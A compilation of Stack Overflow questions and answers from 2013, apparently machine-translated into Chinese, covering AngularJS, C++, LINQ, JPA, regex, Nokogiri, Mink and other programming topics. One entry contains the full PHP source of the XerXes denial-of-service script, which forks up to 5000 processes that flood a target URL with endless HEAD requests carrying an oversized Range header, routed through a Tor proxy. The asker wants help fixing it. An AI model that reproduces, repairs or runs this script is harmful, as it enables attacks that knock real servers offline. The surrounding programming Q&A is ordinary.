> 
> 标签：angularjs, iscroll, iscroll4

我正在使用 phonegap 和 twitter bootstrap（使用 angularui-bootstrap）构建一个应用程序。在使用 CSS 完成固定页眉​​和页脚上花费了很多时间我决定使用“iscroll”解决方案。

问题是我的页脚是动态的并且从控制器获取范围变量。“iscroll”功能通过 angularjs 指令绑定到 id="wrapper" 的 div。

目前，我在每个模板的末尾使用 ng-include，但使用此解决方案我将拥有多个 id="wrapper" 的 div。

示例可能如下所示：

```
<html>
<body>
<div id="footer"></div>
<div ng-view>
<!-- below goes data from template via controller -->
<div id="wrapper" ng-iscroll>
<!-- here goes scrollable content -->
Offer 1
Offer 2
...
</div><!-- end of scrollable div>
<div id="footer">Some footer data.. if wrapper displays offer list, show "refresh button, and next/previous offers page buttons, and "add new offer button".
 If it displays "new offer" phase.. show "offer list" button....etc</div>
</div><!-- end of ng-view div -->
</body>
</html> 
```

以上只会使所需的内容可滚动。但我不能在同一个html文件中使用多个div。

我尝试的第二个解决方案类似，但我将所有控制器内容移动到包装器本身，这使我的页脚也可滚动。

```
<html>
<body>
<div id="footer"></div>
<div id="wrapper" ng-iscroll>
<div ng-view>
<!-- below goes data from template via controller -->
<!-- here goes scrollable content -->
Offer 1
Offer 2
...
<div id="footer">Some footer data.. if wrapper displays offer list, show "refresh button, and next/previous offers page buttons, and "add new offer button".
 If it displays "new offer" phase.. show "offer list" button....etc</div>
<!-- end of scrollable div>
</div><!-- end of ng-view div -->
</body>
</html> 
```

我可以将页脚放在 index.html 文件中的 ng-view 之外，但是如何将范围附加到它？

这是一个“应用程序设计”问题，但我相信有很多用户需要类似的，他们会发现你的想法很有帮助。

# c++ - DWORD 中的封装值

> ID：15973349
> 
> 赞同：2
> 
> 时间：2013-04-12T14:01:37.173
> 
> 标签：c++, windows, bit-manipulation

我如何将两个`unsigned short`( `WORD`) 值打包成一个`unsigned long`( `DWORD`) 值？

我知道如何使用`HIWORD`和`LOWORD`宏来获取它们，但是有没有一种用于`DWORD`快速将它们存储到 a 中的反向宏？

我正在使用 Microsoft Visual Studio 2012 IDE 使用 C++ 编程。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-12T14:04:20.093

[`MAKELONG`](http://msdn.microsoft.com/en-us/library/windows/desktop/ms632660%28v=vs.85%29.aspx)需要两个`WORD`s 并将它们组合成一个`DWORD`：

```
DWORD MAKELONG(
  WORD wLow,
  WORD wHigh
); 
```

不知道为什么不叫它`MAKEDWORD`...

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T14:04:15.967

就像是：

```
 DWORD x = (lo) | (hi << 16); 
```

应该这样做。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-12T14:05:02.393

这个[MAKELONG](http://msdn.microsoft.com/en-us/library/windows/desktop/ms632660%28v=vs.85%29.aspx)宏怎么样？

```
DWORD MAKELONG(
  WORD wLow,
  WORD wHigh
); 
```

# linq - LINQ to SQL 多次查询同一列

> ID：15973351
> 
> 赞同：1
> 
> 时间：2013-04-12T14:01:44.603
> 
> 标签：linq, linq-to-sql, dynamic-linq

我有一堆参数传递给使用 LINQ to SQL 的 C# 方法。所有这些参数都是来自 UI 的过滤器。我需要过滤的四个参数在同一张表的同一列中。例如，该表可能如下所示：

```
ID | FK_ID | Name | Value

1 1 Param1 p1Val
2 1 Param2 p2Val
3 1 Param3 p3.Val
3 1 Param4 p4.Val 
```

我需要获取过滤器参数并将它们与 Value 列匹配，并确保 Name 正确。目前，我通过多次加入同一张表来做到这一点......但我担心这太低效了。最好的方法是什么？我想我想动态构建查询，这样我就可以检查设置了哪些过滤器，但我正在努力解决我应该如何构建我的结果集。现在，它看起来像：（仅供参考 ContextProperties 是有问题的表）

```
var result = 

from f in dataContext.Faults
join m in dataContext.Messages on f.FaultID equals m.FaultID              
join c in dataContext.ContextProperties on m.MessageID equals c.MessageID
join cp in dataContext.ContextProperties on c.MessageID equals cp.MessageID
join cpp in dataContext.ContextProperties on cp.MessageID equals cpp.MessageID
join cppp in dataContext.ContextProperties on cpp.MessageID equals cppp.MessageID
where (f.DateTime >= initDate && f.DateTime <= finishDate) &&
                     f.FaultID == (faultID != Guid.Empty ? faultID : f.FaultID) &&
                     f.Application == (!string.IsNullOrEmpty(application) ? application : f.Application) &&
                     f.FaultCode == (!string.IsNullOrEmpty(faultCode) ? faultCode : f.FaultCode) &&
                     f.FailureCategory == (!string.IsNullOrEmpty(failureCategory) ? failureCategory : f.FailureCategory) &&
                     f.ErrorType == (!string.IsNullOrEmpty(errorType) ? errorType : f.ErrorType) &&
                     (f.FaultSeverity >= 0 && f.FaultSeverity <= maxFaultSeverity)
                     where (c.Value.ToString() == (!string.IsNullOrEmpty(geniusReference) ? geniusReference : c.Value.ToString())
                        && c.Name.ToString() == "GeniusReference") 
                     where (cp.Value.ToString() == (!string.IsNullOrEmpty(programNumber) ? programNumber : cp.Value.ToString())
                        && cp.Name.ToString() == "ProgramGeniusNumber")
                     where (cpp.Value.ToString() == (!string.IsNullOrEmpty(platform) ? platform : cpp.Value.ToString())
                        && cpp.Name.ToString() == "Platform")
                     where (cppp.Value.ToString() == (!string.IsNullOrEmpty(modifiedBy) ? modifiedBy : cppp.Value.ToString())
                        && cppp.Name.ToString() == "ModifiedBy")
                     select new FaultsWithFilters {
                                                    DateTime = f.DateTime
                                                    ,FaultID = f.FaultID
                                                    ,Scope = f.Scope
                                                    ,FaultCode = f.FaultCode
                                                    ,FaultSeverity = f.FaultSeverity
                                                    ,ErrorType = f.ErrorType
                                                    ,Description = f.Description
                                                    ,FaultDescription = f.FaultDescription
                                                    ,FailureCategory = f.FailureCategory
                                                    ,GeniusReference = c.Value.ToString()
                                                    ,ProgramNumber = cp.Value.ToString()
                                                    ,Platform = cpp.Value.ToString()
                                                    ,ModifiedBy = cppp.Value.ToString()
                                                    }; 
```

后面是一堆 where 语句和 select。在此先感谢您的帮助！PS 对不起，糟糕的格式。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T15:07:05.380

一次创建您的查询一个子句，而不是看起来很糟糕`field == (filterSet ? filter : field)`。

首先加入所有必要的表：

```
var query = dataContext.Faults.Join(dataContext.Messages, f => f.FaultID, m => mFaultID, new { f, m })
                              .Join(dataContext.ContextProperties, x => x.m.MessageID, c => c.MessageID, new { x.f, x.m, c });
                              // add all other joins here
                              // and all where conditions that are always valid 
```

然后添加条件`where`条件：

```
if(!string.IsNullOrEmpty(geniusReference))
{
    query = query.Where(x => x.c.Value.ToString() == geniusReference);
}

// instead of:
// where (c.Value.ToString() == (!string.IsNullOrEmpty(geniusReference) ? geniusReference : c.Value.ToString()) 
```

最后添加投影：

```
var results = from x in query
              select new FaultsWithFilters {
                   DateTime = x.f.DateTime
                  ,FaultID = x.f.FaultID
                  ,Scope = x.f.Scope
                  ,FaultCode = x.f.FaultCode
                  ,FaultSeverity = x.f.FaultSeverity
                  ,ErrorType = x.f.ErrorType
                  ,Description = x.f.Description
                  ,FaultDescription = x.f.FaultDescription
                  ,FailureCategory = x.f.FailureCategory
                  ,GeniusReference = x.c.Value.ToString()
                  ,ProgramNumber = x.cp.Value.ToString()
                  ,Platform = x.cpp.Value.ToString()
                  ,ModifiedBy = x.cppp.Value.ToString()
              }; 
```

# android - 方法与在 XML 中定义“样式”相对应

> ID：15973353
> 
> 赞同：0
> 
> 时间：2013-04-12T14:01:50.830
> 
> 标签：android

我在 Android 中自定义了一个按钮。我有这样的课

```
class MyButton extends Button{
} 
```

然后在布局文件中我有这样的定义：

```
<MyButton android:id="@+id/abc"
    style = "@style/ButtonStyle">
</MyButton> 
```

我的问题是：如何调用将“样式”嵌入“MyButton”代码的方法？所以我可以在布局文件中使用这个，但它的效果就像有“风格”：

```
<MyButton android:id="@+id/abc"
    >
</MyButton> 
```

# jquery - Jquery .width() 结果在 Firefox 和 Chrome 中不同

> ID：15973356
> 
> 赞同：1
> 
> 时间：2013-04-12T14:01:55.950
> 
> 标签：jquery, google-chrome, firefox, width

我正在尝试测量字符串的宽度。为此，我将字符串作为值创建一个 div 宽度，将其添加到 DOM 并使用 Jquery 的 .width() 测量宽度。

问题是当我在 Firefox 和 Chrome 中执行脚本时得到不同的结果。

我创建了一个 jsFiddle：http: [//jsfiddle.net/7wjeB/2/](http://jsfiddle.net/7wjeB/2/)

HTML：

```
<body>
<div>
    <input id="input" value="office worker" style="display:block; position:static; font-family: Arial, Helvetica, sans-serif; font-size: 25px;"></input>
    <button onclick="calc()" style="font:Arial; font-size:12px;">Calculate width</button>
</div>
</body> 
```

JavaScript：

```
width = function(font, string) {

    var f = font || '12px arial', o = $('<div>' + string + '</div>').css({
        'position' : 'absolute',
        'float' : 'left',
        'white-space' : 'nowrap',
        'visibility' : 'hidden',
        'font' : f
    }).appendTo($('body')), w = o.width();
    o.remove();
    return w;
};

calc = function() {
    var content = $("#input").val();
    var font = $("#input").css("font-size") + " " + $("#input").css("font-family");
    alert(width(font, content));
}; 
```

我正在使用 Firefox 版本 19.0.2 和 Chrome 版本 26.0.1410.64

# javascript - Python：可以使用 JSON 向包含加密部分的 Python 服务器发送消息吗？

> ID：15973358
> 
> 赞同：0
> 
> 时间：2013-04-12T14:02:00.707
> 
> 标签：javascript, python, python-2.7

我对 JSON 还不太了解，我刚开始学习这个教程，所以请多多包涵：

[http://pymotw.com/2/json/](http://pymotw.com/2/json/)

我的问题是我可以使用 JSON 将包含加密部分的消息发送到 Python 服务器，以便它可以将其转发到另一台服务器吗？

该消息将来自一个通过 SSL 的 Javascript 客户端，其中包含 Python 服务器的一些信息和一个要转发到另一个 Python 服务器的加密消息。该消息将如下所示：

`{ref_obj { msg_obj }_pub_k }_SSL`

这可能吗？我看到了这个帖子：

[Python pycrypto 模块：为什么 simplejson 不能转储加密字符串？](https://stackoverflow.com/questions/8863423/python-pycrypto-module-why-simplejson-cant-dumps-encrypted-string)

如果这不能用 JSON 完成，有人可以建议应该如何完成吗？我唯一的要求是原始消息必须来自 Javascript 客户端（因为它将是 Chrome 中的插件）并转到 Python 服务器进行转发。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:04:45.137

您可以简单地加密 JSON 并将密文作为原始二进制数据发送。

JSON 只是一种格式；没有人强迫您通过网络发送它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:03:20.707

是的，

但某些字符串必须在发送之前转义，然后在另一端转义。通过`from base64 import b64encode, b64decode`或类似的东西。

这样做的原因是 JSON 数据必须是字符串或整数值，基本上没有别的。

`json.dumps({1 : 2, 'hey' : 'you'})`将起作用，这就是您需要保留它的格式。这意味着二进制数据可能会与 json 混淆，因为它需要“正常”字符串。b64encode 确保它只是字符串中的有效字符，没有别的:)

取决于您要完成的工作。您还可以加密整个 JSON 字符串并将其发送到服务器，解密并将其解析为 JSON。

将加密视为隧道。

JSON -> 加密（JSON-string） -> 服务器 -> 解密 -> 解析 JSON

或者，如果您需要 JSON 数据作为元数据，请执行第一个选项。

# 这是一种将所有流量封装为“加密”的方法

```
def encrypt(s):
    encryptedString = AES.encrypt(s)
    return b64encode(encryptedString)

sock.connect(server)
jsondata = {1 : 2}
sock.send( encrypt(json.dumps(jsondata)) ) 
```

在服务器上，您只需执行以下操作：

```
data = sock.recv(1024)
jsondata = json.loads( b64decode(decrypt(data))) )
print(jsondata) 
```

# 这是一种仅加密部分 json 数据的方法：

```
def encrypt(s):
    encryptedString = AES.encrypt(s)
    return b64encode(encryptedString)

sock.connect(server)
jsondata = {1 : encrypt(2)}
sock.send( json.dumps(jsondata) ) 
```

在服务器上：

```
data = sock.recv(1024)
jsondata = json.loads(data)
jsondata[1] = decrypt(b64decode(jsondata[1])) 
```

# java - jpa 独立的自定义类型映射/javax.persistence.x 替代 org.hibernate.annotations.Type 和 org.hibernate.annotations.TypeDef

> ID：15973361
> 
> 赞同：12
> 
> 时间：2013-04-12T14:02:08.613
> 
> 标签：java, hibernate, jpa

我`GameCycle`在 db 中有一个表，其中包含一个`date`type列`number`。此列中的值是 8 位数字，表示像“ `20130301`”这样的倒数日期。映射到这张表上，我有一个类`GameCycle`，它包含一个类型为 iDate 的受保护字段`java.util.Date`。该字段使用自定义类型映射注释为“ `@Type(type = "inverseDate")`”。该类`Gamecycle`用' `@TypeDef(name = "inverseDate", typeClass = InverseDateType.class)`'注释

```
import org.hibernate.annotations.Type;
import org.hibernate.annotations.TypeDef;

@Entity
@TypeDef(name = "inverseDate", typeClass = InverseDateType.class)
@Table(name = "GAMECYCLE")
public class GameCycle implements Comparable<GameCycle>, Serializable
{
    @Type(type = "inverseDate")
    @Column(name = "GC_DATE", nullable = false)
    protected Date iDate = null;
    ... 
```

显然，导入将我绑定到使用 hibernate 作为 jpa 实现，所以我的问题是：

有没有办法摆脱休眠注释并使用纯`javax.persistence`解决方案进行相同的自定义类型映射？

* * *

## 回答 #1

> 赞同：44
> 
> 时间：2014-06-12T22:40:14.990

**自定义类型映射**终于被添加到**JPA 2.1**（[JSR-388](https://jcp.org/en/jsr/detail?id=338)，Java EE 7 的一部分）中。
Hibernate 的[@Type](http://docs.jboss.org/hibernate/orm/3.5/javadocs/org/hibernate/annotations/Type.html)注解不再需要，在 JPA 2.1 中可以用**类型转换代替。**

JPA 2.1 增加了：

*   注释[@Convert](http://docs.oracle.com/javaee/7/api/javax/persistence/Convert.html)
*   注释[@Converts](http://docs.oracle.com/javaee/7/api/javax/persistence/Converts.html)
*   注释[@Converter](http://docs.oracle.com/javaee/7/api/javax/persistence/Converter.html)
*   接口[属性转换器](http://docs.oracle.com/javaee/7/api/javax/persistence/AttributeConverter.html)

最基本的示例：（*示例1：转换基本属性*）-[来自源](http://docs.oracle.com/javaee/7/api/javax/persistence/Convert.html)

```
@Converter
public class BooleanToIntegerConverter 
    implements AttributeConverter<Boolean, Integer> 
{  ... } 
```

...

```
@Entity
@Table(name = "EMPLOYEE")
public class Employee
{

    @Id
    private Long id;

    @Column
    @Convert(converter = BooleanToIntegerConverter.class)
    private boolean fullTime;

} 
```

其他链接：

*   [JPA 2.1 中的类型转换](https://blogs.oracle.com/theaquarium/entry/type_conversion_in_jpa_2)
*   [JPA 2.1 - 如何实现类型转换器](http://www.thoughts-on-java.org/2013/10/jpa-21-how-to-implement-type-converter.html)
*   [在 JPA 2.1 中使用 @Convert 正确映射枚举](http://java.dzone.com/articles/mapping-enums-done-right)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-04-12T14:36:26.173

否。当前版本的 JPA 规范不支持自定义类型映射。这是未来 JPA 2.1 最需要的功能之一。

如果您真的想摆脱特定于 Hibernate 的注释，您唯一能做的就是将您的字段映射为`String`并手动执行必要的转换（在 getter/setter 中）。

但在实践中，几乎每个基于 JPA 的大型应用程序都使用持久性提供程序的一些特定于实现的特性，因此我认为在这种情况下避免对 Hibernate 的依赖并不重要。

# python - 如何在python中使用正则表达式查找两个函数的内容？

> ID：15973373
> 
> 赞同：0
> 
> 时间：2013-04-12T14:02:27.637
> 
> 标签：python, regex

我正在尝试在几个函数中搜索 ("") 之间的文本。我一直在努力解决这个问题，我确信这很简单，但我无法理解。我有以下...

```
search = re.findall('/(functionOne|functionTwo)\(\"(.*?)\"', text, re.MULTILINE) 
```

但它总是返回空白。如果我使用下面的代码，它将返回单个函数引号内的所有文本......

```
search = re.findall('functionOne\(\"(.*?)\"', text, re.MULTILINE) 
```

示例输入就像这样......

```
functionOne("I want this text", iDontWantThis);
functionTwo("I also want this text"); 
```

示例输出将是...

```
I want this text
I also want this text 
```

如何让它从 functionOne 和 functionTwo 返回所有文本？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:25:15.797

感谢您的澄清，这应该可以满足您的要求：它以非捕获或查找括号开始，搜索吸收所有内容直到它到达引号，抓住引号之间的所有内容，并确保它以结束括号结束.

```
>>> buff = """
... functionOne("I want this text", iDontWantThis);
... functionTwo("I also want this text");"""
>>> re.findall("(?:functionOne|functionTwo)\(.*?\"(.*?)\".*?\)",buff)
['I want this text', 'I also want this text'] 
```

如果你有这样的函数调用：

```
foo("hello, this is a very long
     string that needs to be less than
     80 characters", var1, var2) 
```

您需要使用“re.S”来告诉“。” 运算符以包含换行符。

# dos - Notice: Undefined variable: argc in C:\xampp\htdocs\XerXes.php on line 73 Notice: Undefined variable: argv in C:\xampp\htdocs\XerXes.php on line 73

> ID：15973378
> 
> 赞同：0
> 
> 时间：2013-04-12T14:02:32.613
> 
> 标签：dos, argv, ddos, argc

I have recently gotten into DOS attack scripts (How to use them and how to defend from them) and picked up this one called XerXes. I noticed that this has been coded in two different languages .c and .php and I have both. I can get the .c one to work perfectly but not the .php one as I get this error :

Notice: Undefined variable: argc in C:\xampp\htdocs\XerXes.php on line 73

Notice: Undefined variable: argv in C:\xampp\htdocs\XerXes.php on line 73

Here is the script:

```
<?php
function usage($argv) {
print "Usage: php ./{$argv[0]} <number of processes> <url>\n";
die();
}

function head($url) {
while(true) {

    $header[]     = "Connection: keep-alive";
    $header[]    = "Transfer-Encoding: chunked";
    $header[]    = "Range: bytes=0-,<SNIP>,1-1299";   //Sniped for site because it is BIG
    $header[]    = "Accept-Encoding: gzip, deflate, compress";

    $ch         = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_VERBOSE, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);     
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLINFO_HEADER_OUT, false);
    curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:9050");
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    while(true) {
        echo '.';
        curl_setopt($ch, CURLOPT_USERAGENT, "XerXeS Attack Platform - 0wn3d bitch. TANGO DOWN (+http://th3j35t3r.wordpress.com/)");
        curl_exec($ch);    
    }        
    curl_close($ch);
}
}

function main($argc, $argv) {

$status = 1;

if ($argc < 3) {
  usage($argv);
}

if($argv[1] > 5001) {
    echo "MAX OF 5000 threads\n\n";
    die();
}

$pids = Array();
echo "URL: ".$argv[2]."\n";
for ($i = 0; $i < $argv[1]; $i++) {
  $pid = pcntl_fork();

  if ($pid == -1) {
die("ERROR");
  }
  else if ($pid == 0) {
        head($argv[2]);
     exit(0);
  }
  else {
$pids[] = $pid;
      }
    }

foreach ($pids as $pid) {
  pcntl_waitpid($pid, $status);
}

}

main($argc, $argv);  //Errors :(
?> 
```

Any help to resolve this error is appreciated.

PLEASE NOTE: I do not use these codes for attacking servers other than my own for security purposes and how to defend against them. I DO NOT RECOMMEND ANY ONE DDOSing or DOSing.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:05:10.320

你永远不会定义这两个变量。你想传递给`main()`函数什么？

# ms-access - Count records with values in a specific range

> ID：15973386
> 
> 赞同：1
> 
> 时间：2013-04-12T14:02:53.990
> 
> 标签：ms-access

I have a database with that shows invoices and how long it took to pay them. We grade according to the age of the invoice. I have a report set up that shows the employee their min time max time total of records. However, I am having a hard time adding the value that counts all records greater than 14 days and then another that counts all records less than or equal to 14 days. My total records equation is `=Count([MaxOfAge])`. That successfully brings out the total number of records I have tried `=Count([MaxOfAge]>14)` and `=Count([MaxofAge])>14` and every other variation possible, but I just can't get it to work.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:10:32.277

使用`IIf()`如果返回 1，否则返回 0 的表达式`[MaxOfAge]>14`。然后将其嵌套`IIf()`在`Sum()`.

```
=Sum(IIf([MaxOfAge]>14, 1, 0)) 
```

# chef-infra - Chef Apache2 web_app 配置

> ID：15973391
> 
> 赞同：0
> 
> 时间：2013-04-12T14:03:11.743
> 
> 标签：chef-infra, chef-recipe

我正在尝试使用[Opscode cookbook](http://community.opscode.com/cookbooks/apache2)使用 chef 来配置 Apache 。我已经像下面这样配置了我的默认属性。我已经创建了一个模板文件`/vagrant/sites-available/sof.conf`（甚至`/vagrant/sites-available/sof.conf.erb`只是为了确定）。

它从不评估模板或启用站点。怎么了？

（如果有任何改变，请使用 chef-server）

```
{
    "overrides": {},
    "defaults": {
        "apache2": {
            "web_app": {
                "name": "sof",
                "server_name": "localhost",
                "server_aliases": [],
                "docroot": "/vagrant/web"
            },
            "user": "www-data",
            "dir": "/vagrant",
            "log_dir": "/vagrant/logs/http"
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T18:13:01.767

从[文档](https://github.com/opscode-cookbooks/apache2#web_app)中的示例部分看来，您似乎`web_app`只能从其他食谱中声明 s 而不是通过节点属性。

# ruby - 使用 Nokogiri 从交替行收集数据

> ID：15973402
> 
> 赞同：1
> 
> 时间：2013-04-12T14:03:40.153
> 
> 标签：ruby, nokogiri, mechanize

我有这个示例表数据...

```
<table class="main">
  <tr class="main">
    <td align="left">3/4/05</td>
    <td>123-334</td>
    <td></td>
    <td></td>
    <td></td>
    <td align="right">$2.00</td>
  </tr>
  <tr style="background-color:#FFFFD7">
    <td colspan="2">Company Name</td>
    <td colspan="4">Owner Name</td>
  </tr>
   .....
  This goes on like this with every other <tr> holding 
  information that I need together.
   ......
</table> 
```

我已经编写了这段代码，但它只是抓住了第一个而不是全部......

```
data_table = Nokogiri::HTML(page_body, 'UTF-8')
FasterCSV.open('data.csv', 'a') do |csv|

  table = data_table.xpath('//table[@class="main"]')
  rows = table.xpath('tr')
  rows.collect do |row|
    date = row.at_xpath('tr[@class="main"]/td[1]/text()')
    id = row.at_xpath('tr[@class="main"]/td[2]/text()')
    amount = row.at_xpath('tr[@class="main"]/td[3]/text()')
    company = row.at_xpath('tr[@style="background-color:#FFFFD7"]/td[1]/text()')
    name = row.at_xpath('tr[@style="background-color:#FFFFD7"]/td[2]/text()')
    csv << [date, id, amount, company, name]
   end
  end 
```

关于如何将这两个`<tr>`' 放在我的 CSV 文件中的一行的任何想法？并从整个表中获取所有数据？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T16:36:33.510

您可以获取表的所有“trs”，然后用于`each_slice(2)`获取相关行对。

```
html = %q{
<table class="main">
  <tr class="main">
    <td align="left">3/4/05</td>
    <td>123-334</td>
    <td></td>
    <td></td>
    <td></td>
    <td align="right">$2.00</td>
  </tr>
  <tr style="background-color:#FFFFD7">
    <td colspan="2">Company Name</td>
    <td colspan="4">Owner Name</td>
  </tr>
  <tr class="main">
    <td align="left">2/4/05</td>
    <td>223-334</td>
    <td></td>
    <td></td>
    <td></td>
    <td align="right">$4.00</td>
  </tr>
  <tr style="background-color:#FFFFD7">
    <td colspan="2">Company Name2</td>
    <td colspan="4">Owner Name2</td>
  </tr>  
</table>}

data_table = Nokogiri::HTML(html)
table = data_table.xpath('//table[@class="main"]')
rows = table.xpath('tr')
rows.each_slice(2) do |row_pair|
    date = row_pair[0].at_xpath('./td[1]').text
    id = row_pair[0].at_xpath('./td[2]').text
    amount = row_pair[0].at_xpath('./td[6]').text
    company = row_pair[1].at_xpath('./td[1]').text
    name = row_pair[1].at_xpath('./td[2]').text
    p [date, id, amount, company, name]
end 
```

它给出了你想要的数组（并且可以放在你的 csv 中）：

```
["3/4/05", "123-334", "$2.00", "Company Name", "Owner Name"]
["2/4/05", "223-334", "$4.00", "Company Name2", "Owner Name2"] 
```

# php - how can i set timeout for page loading in Mink with Selenium 2 driver?

> ID：15973403
> 
> 赞同：3
> 
> 时间：2013-04-12T14:03:49.973
> 
> 标签：php, functional-testing, mink

My application uses Mink with Selenium 2 driver. when i try to load the page with some resources that are loading slow (or not loading at all) the application waits infinitely until everything is loaded.

for i have several hundreds of iterations in my application - you can imagine how long the script is executed.

question: is there any possibility to set a timeout for page to load? and throw some exception if the page is not loaded during that period?

thanks in advance!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-04-02T10:47:03.753

根据[这篇文章](http://alex-panshin.me/blog/how-to-set-pageload-timeout-for-selenium-with-behat/)，你可以这样做：

```
$driver->setTimeouts(['page load' => 10000]); 
```

此超时以毫秒为单位。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-20T06:23:38.820

要在**selenium ide**中设置页面加载超时，请执行以下步骤：

**1.**打开selenium ide。

**2.**点击选项菜单。

**3.**一般选项卡更改记录命令的默认超时值。

![单击选项菜单后的 Selenium ide 图像][1]

在**selenium 2**中使用此功能

```
WebDriver driver = new FirefoxDriver();
driver.get("http://somedomain/url_that_delays_loading");
WebElement myDynamicElement = (new WebDriverWait(driver, 10))
  .until(ExpectedConditions.presenceOfElementLocated(By.id("myDynamicElement"))); 
```

**尝试这个**

```
 private $timeout = 60000;

public function reload()
    {
        $this->browser
            ->refresh()
            ->waitForPageToLoad($this->timeout)
        ;
    }
  [1]: h 
```

ttp://i.stack.imgur.com/0NKoC.png

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-10-25T13:44:44.210

请在 Featurecontext.php 中使用以下三个函数

```
public function spin($lambda, $retries,$sleep)  {
do {
$result = $lambda($this);
} while (!$result && --$retries && sleep($sleep) !== false);

}
public function find($type, $locator, $retries = 20, $sleep = 1) {
return $this->spin(function($context) use ($type,$locator) {

$page = $context->getSession()->getPage();
if ($el = $page->find($type, $locator)) {
    if ($el->isVisible()) {
        return $el->isVisible();
    }
}
return null;
}, $retries, $sleep); 
```

}

```
/**
* Wait for a element till timeout completes
*
*  @Then /^(?:|I )wait for "(?P<element>[^"]*)" element$/
*/
public function iWaitForSecondsForFieldToBeVisible($seconds,$element) {

  //$this->iWaitSecondsForElement( $this->timeoutDuration, $element);
$this->find('xpath',$element);
} 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2013-05-12T00:44:30.847

Behat[文档](http://docs.behat.org/cookbook/using_spin_functions.html)建议在您的上下文中使用自定义 spin() 函数。

以下 spin() 函数示例取自 behat 文档：

```
public function spin ($lambda, $wait = 60)
{
    for ($i = 0; $i < $wait; $i++)
    {
        try {
            if ($lambda($this)) {
                return true;
            }
        } catch (Exception $e) {
            // do nothing
        }

        sleep(1);
    }

    $backtrace = debug_backtrace();

    throw new Exception(
        "Timeout thrown by " . $backtrace[1]['class'] . "::" . $backtrace[1]['function'] . "()\n" .
        $backtrace[1]['file'] . ", line " . $backtrace[1]['line']
    );
} 
```

不幸的是，我没有一个工作示例如何将其集成到您的上下文中。

# actionscript-3 - URLLoader 如何处理 cookie？

> ID：15973407
> 
> 赞同：3
> 
> 时间：2013-04-12T14:04:12.840
> 
> 标签：actionscript-3, apache-flex, urlloader

我在 Adob​​e AIR for desktop 中使用 AS3，而不是在浏览器中，我不确定这是否会在这种情况下有所不同。

*   我正在使用**[`URLLoader`](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/URLLoader.html#)**.
*   我发送的每个请求都来自一个新`URLLoader`实例。

我以为我必须自己处理 cookie，但我正在使用**[Fiddler](http://fiddler2.com/)**来跟踪 HTTP 请求，并且似乎正在自动处理 cookie，即使我为每个请求使用不同的实例。

我的问题：

*   我是对的，它会自动处理这些 cookie 吗？
*   是否有任何财产来管理这种行为？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T14:08:45.527

实际上，就在发布这个问题之后，我认为它可能由`URLRequest`而不是处理`URLLoader`。这是：[**`URLRequest.manageCookies`**](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/URLRequest.html#manageCookies)

所以，回答我自己的问题：

*   是的，它会自动管理它们。
*   是的，它可以通过适当命名的`manageCookies`属性进行管理。

# php - Twig For 循环数组

> ID：15973410
> 
> 赞同：0
> 
> 时间：2013-04-12T14:04:16.373
> 
> 标签：php, for-loop, twig

我有一个这样的数组，想要获取内容。

```
Array
(
    [0] => Array
        (
            [0] => 1
            [id] => 1
            [1] => Testnews
            [title] => Testnews
            [2] => Dies ist eine kleine <strong>Testnews!</strong>
            [text] => Dies ist eine kleine <strong>Testnews!</strong>
            [3] => 1
            [type] => 1
            [4] => 1
            [timestamp] => 1
            [5] => 0
            [status] => 0
        )

) 
```

我尝试了以下方法：

```
 {% for latest_news in news %}
                        {% for id, title in latest_news %}
                            id : {{ id }}
                            title : {{ title }}
                        {% endfor %}
                    {% endfor %} 
```

那行得通，但我认为这不是正确的方法。

它应该是什么样子？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:09:34.337

我刚刚找到了正确且最简单的解决方案：

```
 {% for latest_news in news %}
                     id : {{ latest_news.id }}                      
                     title : {{ latest_news.title }}                      
                {% endfor %} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:08:33.987

我会说这是对的。你也可以这样做：

```
{% for latest_news in news %}
    {% for news_item in latest_news %}
         id: {{ news_item.id }}
         title: {{ news_item.title }}
    {% endfor %}
{% endfor %} 
```

# asp-classic - 需要 ASP 对象

> ID：15973411
> 
> 赞同：0
> 
> 时间：2013-04-12T14:04:18.130
> 
> 标签：asp-classic

我在经典 ASP 中有错误：

```
Microsoft VBScript runtime error '800a01a8'
Object required: 'SqlStatement'
/Data/Database.asp, line 186 
```

第 186 行是`SqlStatement.CommandText = sql`：

这是我的代码：

```
Dim Db, SqlStatement, RS
Set Db = Nothing
Set SqlStatement = Nothing
Set RS = Nothing

' Initialize the database once
Private Sub SqlInitDb()
    If isNull(Db) Or varType(Db) = vbEmpty Or IsObject(Db) = False Then
        ' Create database connection object
        Set Db = Server.CreateObject("ADODB.Connection")
        ' Set connection timeout
